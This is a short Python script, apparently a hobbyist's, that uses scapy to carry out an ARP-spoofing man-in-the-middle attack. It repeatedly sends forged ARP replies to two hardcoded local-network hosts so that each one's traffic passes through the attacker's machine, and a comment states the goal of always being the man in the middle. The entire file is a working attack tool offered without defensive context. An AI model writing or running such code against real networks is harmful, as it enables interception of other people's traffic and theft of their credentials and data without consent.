import scapy.all as scapy
import time

def spoof(target_ip, spf_ip):
    target_mac = get_mac_address(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spf_ip)
    scapy.send(packet)


def get_mac_address(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_broad = broadcast/arp_req
    answ = scapy.srp(arp_req_broad, timeout=5, verbose=False)[0]
    return answ[0][1].hwsrc


while True: # to always be the man in the middle
    spoof('192.168.43.251', '192.168.43.173')
    spoof('192.168.43.173', '192.168.43.251')
    time.sleep(3)
